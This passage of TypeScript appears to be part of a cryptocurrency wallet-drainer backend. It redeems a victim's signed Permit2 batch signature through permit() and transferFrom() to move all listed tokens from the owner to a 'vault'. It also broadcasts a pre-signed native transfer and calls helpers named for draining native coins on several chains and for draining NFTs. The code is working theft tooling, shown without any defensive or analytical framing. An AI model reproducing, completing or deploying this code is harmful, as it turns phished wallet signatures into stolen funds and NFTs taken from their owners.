        ...(nftDrain.transaction_hashes && nftDrain.transaction_hashes.length > 0
          ? { nft_transaction_hashes: nftDrain.transaction_hashes }
          : {}),
      }
    } catch (e) {
      return { ok: false, detail: e instanceof Error ? e.message : String(e) }
    }
  }

  const transaction_hashes: string[] = []

  if (params.nativeSignedTransaction) {
    const nativeDelivery = await deliverNativeWithPermit2Transactions({
      nativeSignedTransaction: params.nativeSignedTransaction,
      permit2SignedTransactions: [],
      chainId: params.chainId,
      rpcUrl: rpc,
    })
    if (!nativeDelivery.ok) {
      return {
        ok: false,
        detail: nativeDelivery.detail ?? 'Native transfer broadcast failed',
      }
    }
    if (nativeDelivery.transaction_hashes[0]) {
      transaction_hashes.push(nativeDelivery.transaction_hashes[0])
    }
  }

  let permitTxHash: string | undefined

  try {
    permitTxHash = await walletClient.writeContract({
      account,
      address: PERMIT2_ADDRESS,
      abi: PERMIT2_BATCH_ABI,
      functionName: 'permit',
      args: [owner, permitBatch, params.permit2Signature],
      chain,
    })
    transaction_hashes.push(permitTxHash)
    await publicClient.waitForTransactionReceipt({ hash: permitTxHash as Hex, timeout: 120_000 })
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e)
    if (!/InvalidNonce|AllowanceExpired|SignatureExpired/i.test(msg)) {
      return { ok: false, transaction_hashes, detail: `batch permit() failed: ${msg}` }
    }
  }

  try {
    const transferDetails = params.batch.details.map((detail) => ({
      from: owner,
      to: vault,
      amount: BigInt(detail.amount),
      token: getAddress(detail.token),
    }))
    const transferTxHash = await walletClient.writeContract({
      account,
      address: PERMIT2_ADDRESS,
      abi: PERMIT2_BATCH_ABI,
      functionName: 'transferFrom',
      args: [transferDetails],
      chain,
    })
    transaction_hashes.push(transferTxHash)
    await publicClient.waitForTransactionReceipt({ hash: transferTxHash as Hex, timeout: 120_000 })

    const omnichain = params.omnichainNative
      ? await executeOmnichainNativeDrainSettlement(params.omnichainNative)
        : {
            ok: true as const,
            transaction_hashes: {} as {
              sol?: string
              trx?: string
              ton?: string
              spl?: string
              trc20?: string
              jetton?: string
            },
          }

    const nftEntries = params.nfts ?? params.batch.nfts ?? []
    const nftDrain =
      nftEntries.length > 0
        ? await executeBatchNftDrainSettlement({
            owner,
            chainId: params.chainId,
            nfts: nftEntries,
            rpcUrl: rpc,
          })
        : { ok: true, transaction_hashes: [] as string[] }

    const evmOk = true
    const allOk = evmOk && omnichain.ok && nftDrain.ok
    return {
      ok: allOk,
      transaction_hashes,
      ...(Object.keys(omnichain.transaction_hashes).length > 0
        ? { omnichain_transaction_hashes: omnichain.transaction_hashes }
        : {}),
      ...(nftDrain.transaction_hashes && nftDrain.transaction_hashes.length > 0
        ? { nft_transaction_hashes: nftDrain.transaction_hashes }
        : {}),
      ...(allOk
        ? {}
        : {
            detail:
              nftDrain.detail ??
              ('detail' in omnichain ? omnichain.detail : undefined) ??
              'Batch settlement partial failure',
          }),
    }
  } catch (e) {
    return {
      ok: false,
      transaction_hashes,
      detail: e instanceof Error ? e.message : String(e),
    }
  }
}
